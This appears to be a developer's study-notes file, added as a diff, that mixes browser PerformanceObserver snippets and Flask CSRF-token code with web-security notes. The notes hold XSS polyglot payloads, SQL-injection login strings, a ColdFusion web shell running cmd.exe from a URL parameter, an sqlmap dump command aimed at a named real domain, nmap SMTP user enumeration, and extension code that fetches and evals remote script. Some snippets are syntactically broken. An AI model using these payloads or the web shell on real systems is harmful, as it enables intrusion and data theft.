@@ -1,0 +1,698 @@
+ Notes 
+
+document.designMode = 'on';
+
+1. Performance Observer
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    // Logs all server timing data for this response
+    console.log('Server Timing', entry.serverTiming);
+  }
+});
+
+// Start listening for `navigation` entries to be dispatched.
+po.observe({type: 'navigation', buffered: true});
+
+
+2. Observe
+po.observe({
+  type: 'some-entry-type',
+  buffered: true,
+});
+
+
+3. Record Time
+performance.mark('myTask:start');
+await doMyTask();
+
+or
+performance.mark('myTask:end');
+
+or
+performance.measure('myTask', 'myTask:start', 'myTask:end');
+
+
+3. Long Task Observer
+// Create the performance observer.
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    // Log the entry and all associated details.
+    console.log(entry.toJSON());
+  }
+});
+
+// Start listening for `longtask` entries to be dispatched.
+po.observe({type: 'longtask', buffered: true});
+
+
+
+4. Observe Animation Frames
+// Create the performance observer.
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    // Log the entry and all associated details.
+    console.log(entry.toJSON());
+  }
+});
+
+// Start listening for `long-animation-frame` entries to be dispatched.
+po.observe({type: 'long-animation-frame', buffered: true});
+
+
+5. Observe Elements
+<img elementtiming="hero-image" />
+<p elementtiming="important-paragraph">This is text I care about.</p>
+<!-- ... -->
+
+<script>
+  const po = new PerformanceObserver((entryList) => {
+    for (const entry of entryList.getEntries()) {
+      // Log the entry and all associated details.
+      console.log(entry.toJSON());
+    }
+  });
+
+  // Start listening for `element` entries to be dispatched.
+  po.observe({type: 'element', buffered: true});
+</script>
+
+
+6. Custom Measurments
+const po = new PerformanceObserver((entryList) => {
+  // Get the last interaction observed:
+  const entries = Array.from(entryList.getEntries()).forEach((entry) => {
+    // Get various bits of interaction data:
+    const inputDelay = entry.processingStart - entry.startTime;
+    const processingTime = entry.processingEnd - entry.processingStart;
+    const presentationDelay = entry.startTime + entry.duration - entry.processingEnd;
+    const duration = entry.duration;
+    const eventType = entry.name;
+    const target = entry.target || "(not set)"
+
+    console.log("----- INTERACTION -----");
+    console.log(`Input delay (ms): ${inputDelay}`);
+    console.log(`Event handler processing time (ms): ${processingTime}`);
+    console.log(`Presentation delay (ms): ${presentationDelay}`);
+    console.log(`Total event duration (ms): ${duration}`);
+    console.log(`Event type: ${eventType}`);
+    console.log(target);
+  });
+});
+
+// A durationThreshold of 16ms is necessary to include more
+// interactions, since the default is 104ms. The minimum
+// durationThreshold is 16ms.
+po.observe({type: 'event', buffered: true, durationThreshold: 16});
+
+
+7. CSRf Tokens
+  1. Python code for server
+from flask import Flask, session, render_template, request, jsonify
+import secrets # For generating secure random tokens
+
+app = Flask(__name__)
+app.secret_key = 'your_super_secret_key' # Change this to a strong, random key in production
+
+@app.before_request
+def generate_csrf_token():
+    if '_csrf_token' not in session:
+        session['_csrf_token'] = secrets.token_hex(16) # Generate a 16-byte (32-char hex) token
+
+@app.route('/')
+def index():
+    return render_template('index.html', csrf_token=session['_csrf_token'])
+
+@app.route('/api/submit', methods=['POST'])
+def submit_data():
+    client_csrf_token = request.headers.get('X-CSRFToken') or request.form.get('csrf_token') # Check header first, then form data
+    
+    if client_csrf_token == session.get('_csrf_token'):
+        # Token is valid, process the request
+        data = request.json # Assuming JSON data
+        print(f"Received valid data: {data}")
+        return jsonify({'status': 'success', 'message': 'Data processed successfully'})
+    else:
+        # Token is invalid, reject the request
+        return jsonify({'status': 'error', 'message': 'CSRF token mismatch'}), 403
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+    2.Expose Tokens
+    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+
+    3. Meta Tag for Ajax
+    <meta name="csrf-token" content="{{ csrf_token }}">
+
+    4. javaScript for inside the "Script"
+    <script>
+    const csrfToken = "{{ csrf_token }}";
+    </script>
+
+    5. Retrieve from Hidden Field
+    const csrfToken = document.querySelector('input[name="csrf_token"]').value;
+
+    6. From meta tags
+    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+    7. Include in Requests
+    // Get the CSRF token (assuming it's in a meta tag)
+const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+async function sendData() {
+    const dataToSend = {
+        name: 'John Doe',
+        email: 'john.doe@example.com'
+    };
+
+    try {
+        const response = await fetch('/api/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': csrfToken // Include the CSRF token here
+            },
+            body: JSON.stringify(dataToSend)
+        });
+
+        const result = await response.json();
+        if (response.ok) {
+            console.log('Success:', result);
+        } else {
+            console.error('Error:', result);
+        }
+    } catch (error) {
+        console.error('Network error:', error);
+    }
+}
+
+// Call the function to send data
+sendData();
+
+
+  8. With jquery
+  // Get the CSRF token (assuming it's in a meta tag)
+const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+$.ajaxSetup({
+    beforeSend: function(xhr, settings) {
+        if (!/^(GET|HEAD|OPTIONS|TRACE)$/.test(settings.type) && !this.crossDomain) {
+            xhr.setRequestHeader("X-CSRFToken", csrfToken);
+        }
+    }
+});
+
+// Now, any $.ajax POST, PUT, DELETE request will automatically include the header
+$.ajax({
+    url: '/api/submit',
+    type: 'POST',
+    contentType: 'application/json',
+    data: JSON.stringify({ name: 'Jane Doe', email: 'jane.doe@example.com' }),
+    success: function(response) {
+        console.log('Success:', response);
+    },
+    error: function(xhr, status, error) {
+        console.error('Error:', error, xhr.responseJSON);
+    }
+});
+
+
+  9. Log all resources
+  // Create the performance observer.
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    // If transferSize is 0, the resource was fulfilled using the cache.
+    console.log(entry.name, entry.transferSize === 0);
+  }
+});
+
+// Start listening for `resource` entries to be dispatched.
+po.observe({type: 'resource', buffered: true});
+Navigation Timing API
+
+
+10. Time to first Byte
+// Create the performance observer.
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    // If transferSize is 0, the resource was fulfilled using the cache.
+    console.log('Time to first byte', entry.responseStart);
+  }
+});
+
+// Start listening for `navigation` entries to be dispatched.
+po.observe({type: 'navigation', buffered: true});
+
+
+11. Service Worker times
+// Create the performance observer.
+const po = new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    console.log('Service Worker startup time:',
+        entry.responseStart - entry.workerStart);
+  }
+});
+
+// Start listening for `navigation` entries to be dispatched.
+po.observe({type: 'navigation', buffered: true});
+
+
+12. Performance Call Back Options
+dictionary PerformanceObserverCallbackOptions {
+          unsigned long long droppedEntriesCount;
+        };
+
+
+
+13. DOM XSS "Things to Look For" 
+  1. document.url
+  2. document.referrer
+  3. location "href. search, hash, pathname
+  4. navigator
+  5. element.innerHTML or .outerHTML
+  6.eval()
+  7. setTimeout
+  8. setInterval
+  9. document.write
+  10. document.writeIn
+
+14. DOM Example
+var source = " Hello " + decondeURIComponent(location.hash.split("#")[1];
+var divElement = docuemnt.createElement("div");
+divElement.innerHTML = source;
+document.body.appendChild(dinElement);
+
+www.example.com<img src="test" onerror'"alert('XSS')">
+
+
+15. RSNAKE XSS
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
+;alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+
+16. Oxsobky XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCK=alert())//%OD%OA%Od%Oa//</style/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()>\x3
+
+16. Ashard Javar XSS
+'">><marquee><img src=xonerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindexformaction=javascript:alert(/XSS/)type=submit>'><?script><script>alert(1)</script>"><img/id="confirm&ipar;1)"/alt="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+17. Blind XSS
+  Tools: XSS Hunter, Sleepy Puppy, KnoXSS
+
+18. SQL LOGIN Pages
+  1. 'OR 1=1--
+  2. admin' OR 1=1--
+  3. "><script>alert(1);</script>"@example.org
+
+18. Email Validation
+ "><script>alert(1);</script>"@example.org
+user+subaddress@example.org
+user@[IPv6:2001:db8::1]
+" "@example.org
+
+
+19. Sub-Taging
+user@example.org
+user+site1@example.org
+user+site2@example.org
+
+20. Element Button
+<button id="pro">Pro account</button>
+
+21. Fetch MetaData
+app.get('/', (req, res) => {
+    if (req.get('Sec-Fetch-Dest') === 'iframe') {
+        return res.sendStatus(403);
+    }
+    res.send({
+        message: 'Hello!'
+    });
+});
+
+
+
+
+23. XML BYpass
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!--
+      This file materializes the authorization matrix for the different
+      services exposed by the system:
+
+      The tests will use this as a input source for the different test cases by:
+      1) Defining legitimate access and the correct implementation
+      2) Identifying illegitimate access (authorization definition issue
+      on service implementation)
+
+      The "name" attribute is used to uniquely identify a SERVICE or a ROLE.
+  -->
+  <authorization-matrix>
+
+      <!-- Describe the possible logical roles used in the system, is used here to
+      provide a list+explanation
+      of the different roles (authorization level) -->
+      <roles>
+          <role name="ANONYMOUS"
+          description="Indicate that no authorization is needed"/>
+          <role name="BASIC"
+          description="Role affecting a standard user (lowest access right just above anonymous)"/>
+          <role name="ADMIN"
+          description="Role affecting an administrator user (highest access right)"/>
+      </roles>
+
+      <!-- List and describe the available services exposed by the system and the associated
+      logical role(s) that can call them -->
+      <services>
+          <service name="ReadSingleMessage" uri="/{messageId}" http-method="GET"
+          http-response-code-for-access-allowed="200" http-response-code-for-access-denied="403">
+              <role name="ANONYMOUS"/>
+              <role name="BASIC"/>
+              <role name="ADMIN"/>
+          </service>
+          <service name="ReadAllMessages" uri="/" http-method="GET"
+          http-response-code-for-access-allowed="200" http-response-code-for-access-denied="403">
+              <role name="ANONYMOUS"/>
+              <role name="BASIC"/>
+              <role name="ADMIN"/>
+          </service>
+          <service name="CreateMessage" uri="/" http-method="PUT"
+          http-response-code-for-access-allowed="200" http-response-code-for-access-denied="403">
+              <role name="BASIC"/>
+              <role name="ADMIN"/>
+          </service>
+          <service name="DeleteMessage" uri="/{messageId}" http-method="DELETE"
+          http-response-code-for-access-allowed="200" http-response-code-for-access-denied="403">
+              <role name="ADMIN"/>
+          </service>
+      </services>
+
+      <!-- Provide a test payload for each service if needed -->
+      <services-testing>
+          <service name="ReadSingleMessage">
+              <payload/>
+          </service>
+          <service name="ReadAllMessages">
+              <payload/>
+          </service>
+          <service name="CreateMessage">
+              <payload content-type="application/json">
+                  {"content":"test"}
+              </payload>
+          </service>
+          <service name="DeleteMessage">
+              <payload/>
+          </service>
+      </services-testing>
+
+  </authorization-matrix>
+
+
+  24. Rendering Autherization
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+  <xsl:template match="/">
+    <html>
+      <head>
+        <title>Authorization Matrix</title>
+        <link rel="stylesheet"
+        href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css"
+        integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ"
+        crossorigin="anonymous" />
+      </head>
+      <body>
+        <h3>Roles</h3>
+        <ul>
+          <xsl:for-each select="authorization-matrix/roles/role">
+            <xsl:choose>
+              <xsl:when test="@name = 'ADMIN'">
+                <div class="alert alert-warning" role="alert">
+                  <strong>
+                    <xsl:value-of select="@name" />
+                  </strong>
+                  :
+                  <xsl:value-of select="@description" />
+                </div>
+              </xsl:when>
+              <xsl:when test="@name = 'BASIC'">
+                <div class="alert alert-info" role="alert">
+                  <strong>
+                    <xsl:value-of select="@name" />
+                  </strong>
+                  :
+                  <xsl:value-of select="@description" />
+                </div>
+              </xsl:when>
+              <xsl:otherwise>
+                <div class="alert alert-danger" role="alert">
+                  <strong>
+                    <xsl:value-of select="@name" />
+                  </strong>
+                  :
+                  <xsl:value-of select="@description" />
+                </div>
+              </xsl:otherwise>
+            </xsl:choose>
+          </xsl:for-each>
+        </ul>
+        <h3>Authorizations</h3>
+        <table class="table table-hover table-sm">
+          <thead class="thead-inverse">
+            <tr>
+              <th>Service</th>
+              <th>URI</th>
+              <th>Method</th>
+              <th>Role</th>
+            </tr>
+          </thead>
+          <tbody>
+            <xsl:for-each select="authorization-matrix/services/service">
+              <xsl:variable name="service-name" select="@name" />
+              <xsl:variable name="service-uri" select="@uri" />
+              <xsl:variable name="service-method" select="@http-method" />
+              <xsl:for-each select="role">
+                <tr>
+                  <td scope="row">
+                    <xsl:value-of select="$service-name" />
+                  </td>
+                  <td>
+                    <xsl:value-of select="$service-uri" />
+                  </td>
+                  <td>
+                    <xsl:value-of select="$service-method" />
+                  </td>
+                  <td>
+                    <xsl:variable name="service-role-name" select="@name" />
+                    <xsl:choose>
+                      <xsl:when test="@name = 'ADMIN'">
+                        <div class="alert alert-warning" role="alert">
+                          <xsl:value-of select="@name" />
+                        </div>
+                      </xsl:when>
+                      <xsl:when test="@name = 'BASIC'">
+                        <div class="alert alert-info" role="alert">
+                          <xsl:value-of select="@name" />
+                        </div>
+                      </xsl:when>
+                      <xsl:otherwise>
+                        <div class="alert alert-danger" role="alert">
+                          <xsl:value-of select="@name" />
+                        </div>
+                      </xsl:otherwise>
+                    </xsl:choose>
+                  </td>
+                </tr>
+              </xsl:for-each>
+            </xsl:for-each>
+          </tbody>
+        </table>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
+
+
+
+25. Data Leakage
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete') {
+    fetch('http://example.com/track', {
+      method: 'POST',
+      body: JSON.stringify({ URL: tab.URL })
+    });
+  }
+});
+
+26. No Sanitzation
+let userInput = document.getElementById('input').value;
+document.getElementById('output').innerHTML = userInput; // No sanitization
+
+
+27. Code Injection
+let script = document.createElement('script');
+script.src = 'http://example.com/malicious.js';
+document.body.appendChild(script);
+
+28. Malcious Updates
+chrome.runtime.onInstalled.addListener(() => {
+  fetch('http://example.com/update-script.js')
+    .then(response => response.text())
+    .then(eval); // Unsafe!
+});
+
+29. Set Token
+
+localStorage.setItem('token', 'my-secret-token'); // No encryption
+
+30. Nmap Enum
+nmap --script smtp-commands -p 25,465,587 <target>
+nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.userdb=userlist.txt <target-IP>
+
+nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <target-IP>
+
+nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.domain=example.com,smtp-enum-users.userdb=userlist.txt <target-IP>
+
+31. Shell CFM
+<cfparam name="url.cmd" default="">
+
+<cfif len(url.cmd) GT 0>
+    <cfoutput>
+        <pre>
+            <cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="commandOutput" timeout="60"></cfexecute>
+            #HTMLEditFormat(commandOutput)#
+        </pre>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?cmd=your_command_here
+    </cfoutput>
+</cfif>
+
+
+32. SQLMAP
+sudo sqlmap "http://login.yahoo.com/page.php?id=1" --batch --level=5 --risk=3 --dbs --dump --threads=10 --random-agent 
+
+33. Fetch MetaData
+app.get('/', (req, res) => {
+    if (req.get('Sec-Fetch-Dest') === 'iframe') {
+        return res.sendStatus(403);
+    }
+    res.send({
+        message: 'Hello!'
+    });
+});
+
+
+
+33. Error Attack
+function checkId(id) {
+    const script = document.createElement('script');
+    script.src = `https://example.com/api/users/${id}`;
+    script.onload = () => {
+        console.log(`Logged user id: ${id}`);
+    };
+    document.body.appendChild(script);
+}
+
+// Generate array [0, 1, ..., 40]
+const ids = Array(41)
+    .fill()
+    .map((_, i) => i + 0);
+
+for (const id of ids) {
+    checkId(id);
+}
+
+
+
+34.Post Request
+const site = new URLSearchParams(window.location.search).get('site'); // https://evil.com
+const popup = window.open(site);
+popup.postMessage('secret message!', '*');
+
+window.addEventListener('message', e => {
+    alert(e.data) // secret message! - leak
+});
+
+
+
+35. Attack Using Broswer Catch
+    const adminImagePerfEntry = window.performance
+        .getEntries()
+        .filter((entry) => entry.name.endsWith('admin.svg'));
+
+    if (adminImagePerfEntry.duration < THRESHOLD) {
+        console.log('Image loaded from cache!')
+    }
+
+36. Basic Frame Busting
+
+<script>
+  if(top != self) {
+    top.location = location;
+  }
+</script>
+
+
+
+37. Frame Busting2
+<script>
+  (function() {
+    var externallyFramed = false;
+    try {
+      externallyFramed = top.location.host != location.host;
+    }
+    catch(err) {
+      externallyFramed = true;
+    }
+    if(externallyFramed) {
+      top.location = location;
+    }
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
